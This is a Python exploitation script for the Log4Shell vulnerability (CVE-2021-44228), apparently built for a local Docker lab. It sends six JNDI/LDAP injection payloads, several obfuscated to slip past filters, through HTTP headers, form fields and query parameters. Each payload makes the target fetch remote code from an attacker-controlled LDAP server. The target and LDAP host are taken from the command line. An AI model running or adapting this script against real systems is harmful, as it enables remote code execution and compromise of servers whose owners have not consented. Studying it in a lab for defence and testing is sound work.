#!/usr/bin/env python3

import requests
import sys
import time
from colorama import Fore, Style, init

init(autoreset=True)

def print_banner():
    banner = f"""
{Fore.RED}╔══════════════════════════════════════╗
║      Log4Shell Exploitation Tool      ║
║         CVE-2021-44228                ║
╚══════════════════════════════════════╝{Style.RESET_ALL}
"""
    print(banner)

def exploit_target(target_url, ldap_server="ldap-server:1389"):
    payloads = [
        f"${{jndi:ldap://{ldap_server}/Exploit}}",
        f"${{jndi:${{lower:l}}${{lower:d}}${{lower:a}}${{lower:p}}://{ldap_server}/Exploit}}",
        f"${{${{::-j}}ndi:ldap://{ldap_server}/Exploit}}",
        f"${{${{env:BARFOO:-j}}ndi:ldap://{ldap_server}/Exploit}}",
        f"${{jndi:ldap://127.0.0.1#.{ldap_server}:1389/Exploit}}",
        f"${{${{lower:j}}${{lower:n}}${{lower:d}}${{lower:i}}:${{lower:l}}${{lower:d}}${{lower:a}}${{lower:p}}://{ldap_server}/Exploit}}"
    ]
    
    print(f"\n{Fore.YELLOW}[*] Target: {target_url}{Style.RESET_ALL}")
    
    # Test different endpoints and methods
    endpoints = [
        ("/login", "POST", {"username": "admin", "password": "password"}),
        ("/api/v1/search", "GET", None),
        ("/api/v1/callback", "POST", {"callback": "test"})
    ]
    
    for endpoint, method, data in endpoints:
        url = target_url + endpoint
        print(f"\n{Fore.CYAN}[*] Testing endpoint: {endpoint}{Style.RESET_ALL}")
        
        for i, payload in enumerate(payloads, 1):
            print(f"  [{i}/{len(payloads)}] Trying payload variant...")
            
            headers = {
                "User-Agent": payload,
                "X-Api-Version": payload,
                "X-Forwarded-For": payload,
                "X-Custom-Header": payload,
                "Referer": payload
            }
            
            try:
                if method == "POST":
                    if data:
                        # Inject payload into POST data
                        for key in data:
                            injected_data = data.copy()
                            injected_data[key] = payload
                            
                            response = requests.post(url, data=injected_data, headers=headers, timeout=5)
                            
                            if response.status_code == 200:
                                print(f"    {Fore.GREEN}✓ Payload sent via {key} parameter{Style.RESET_ALL}")
                    else:
                        response = requests.post(url, headers=headers, timeout=5)
                
                elif method == "GET":
                    params = {"query": payload}
                    response = requests.get(url, params=params, headers=headers, timeout=5)
                    
                    if response.status_code == 200:
                        print(f"    {Fore.GREEN}✓ Payload sent via query parameter{Style.RESET_ALL}")
                
                # Also send via headers for all requests
                for header, value in headers.items():
                    print(f"    {Fore.GREEN}✓ Payload injected in {header} header{Style.RESET_ALL}")
                
                time.sleep(0.5)  # Small delay between attempts
                
            except requests.exceptions.RequestException as e:
                print(f"    {Fore.RED}✗ Request failed: {str(e)}{Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}[*] Exploitation attempts completed!{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Check the LDAP server logs for incoming connections{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Check /tmp/pwned.txt on the vulnerable container{Style.RESET_ALL}")

def main():
    print_banner()
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = "http://vulnerable-app:8080"
    
    if len(sys.argv) > 2:
        ldap = sys.argv[2]
    else:
        ldap = "ldap-server:1389"
    
    print(f"{Fore.BLUE}[+] Starting Log4Shell exploitation...{Style.RESET_ALL}")
    exploit_target(target, ldap)
    
    print(f"\n{Fore.CYAN}[*] Manual verification commands:{Style.RESET_ALL}")
    print("  1. Check vulnerable app container:")
    print("     docker exec log4shell-vulnerable ls -la /tmp/")
    print("  2. View LDAP server logs:")
    print("     docker logs ldap-exploit-server")
    print("  3. Check application logs:")
    print("     docker exec log4shell-vulnerable cat /app/logs/application.log")

if __name__ == "__main__":
    main()